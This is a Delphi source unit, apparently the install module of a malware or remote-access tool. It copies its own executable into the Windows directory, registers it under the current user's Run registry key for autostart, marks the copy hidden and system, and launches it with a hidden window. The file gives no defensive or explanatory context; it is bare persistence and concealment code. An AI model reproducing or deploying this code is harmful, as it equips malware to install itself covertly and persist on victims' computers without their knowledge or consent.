unit uInstall;

interface

uses
  Windows, ShellApi, uConst, uUtils, uProcess;

function Install :Boolean;

const
  faHidden    = $00000002 platform;
  faSysFile   = $00000004 platform;

implementation

function FileSetAttr(const FileName: string; Attr: Integer): Integer;
begin
  Result := 0;
  if not SetFileAttributes(PChar(FileName), Attr) then
    Result := GetLastError;
end;

procedure HideFile(FileName :String);
begin
  FileSetAttr(FileName, faHidden or faSysFile);
end;

function Install :Boolean;
var
  hRegKey :HKEY;
  Path  :String;
begin
  Result := False;
  if C_START = 1 then
  begin
	  Path := WinDir(C_VALUE);
    RegOpenKeyEx(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, KEY_SET_VALUE, hRegKey);
    RegSetValueEx(hRegKey, PChar(C_KEY), 0, REG_SZ, PChar(Path), Length(Path)+1);
    RegCloseKey(hRegKey);
    if not FileExists(Path) then
    begin
      CopyFile(PChar(ParamStr(0)), PChar(Path), False);
      if C_HIDE = 1 then HideFile(Path);
      ShellExecute(0, 'open', PChar(Path), nil, nil, SW_HIDE);
      Result := True;
    end;
  end;
end;

end.
